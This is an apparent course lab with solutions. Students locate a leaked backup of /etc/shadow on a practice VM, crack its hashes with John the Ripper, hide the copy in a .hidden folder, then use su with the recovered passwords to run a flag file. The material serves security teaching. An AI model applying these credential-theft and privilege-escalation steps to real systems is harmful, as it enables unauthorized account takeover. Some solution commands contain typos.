# Su-per Privileged

In this activity, you'll get a chance to crack user passwords, and then use `su` to run files you ordinarily don't have access to.

- Identify users who are members of `hackers`
 > **Solution**: run `groups <username>` for each user. You'll find that loki, poseidon, student, and zeus are members of `hackers`.

- Find the backup of `/etc/shadow` with "other" read permissions saved in one of their home folders.
  **Solution** `sudo find /home -iname *shadow`

-
 Copy backed-up `shadow` and remove all members who are not `hackers`
  > **Solution**: `cp /var/tmp shadow /home/instructor`. Then, use nano/vi to remove all users except loki, poseidon, and zeus.
- Use `john` to crack passwords in `shadow`
  > **Solution**
  > ```bash
  > john shadow
  > john --show shadow
  > ```
- Use `su` to assume identity of another user
  > **Solution**: run `su <username>` and enter the user's password.

## Instructions

### Cracking Passwords

- What happens when you try to read `/etc/shadow`? Why does this happen?
   > **Solution**: You can't see `/etc/shadow`, because only `root` has permissions to read this file.

- An administrator left a copy of `/etc/shadow` in one of the tmp directories. Find it.
   > **Solution**: Look for: `/var/tmp/shadow.bak`

- Create a new folder in your `Documents` directory, called `.hidden`, and change into it.
   > **Solution**: `mkdir ~/Docuents/.hidden`
                 `cd ~/Documents/.hidden`

- Move the copied `shadow` file you found into `.hidden`, and change into `.hidden`.
   > **Solution**: `mv /var/tmp/shadow.bak ~/Documents/.hidden`

- There's a program called `john-the-ripper` on your VM. Run it, and pass the shadow file as argument.
   > **Solution**:From `~/Documents/.hidden`: `john shadow.bak`

- What do you see when `john` finishes running? Record your response.
   > **Solution**:
   >   - lakers (poseidon)
   >   - ferrari (loki)
   >   - starwars (zeus)

### Finding the Flag

- One of the users has a "flag" file somewhere in their home directory that is executable.
- Find out who, and what the path to the file is.
  - Run: `find /home -iname 'flag'`
  - This raises a `Permission denied` error for a directory `.hidden` owned by `poseidon`...

- Use the passwords you just cracked to login as the user who owns the flag.
  - `su poseidon`
  - Use password: `lakers`

- Move into the directory you found, and run the flag file.
  - `cd /home/poseidon/.hidden`
  - `./flag`

- If all goes well, you should get a message verifying that you have found the flag!
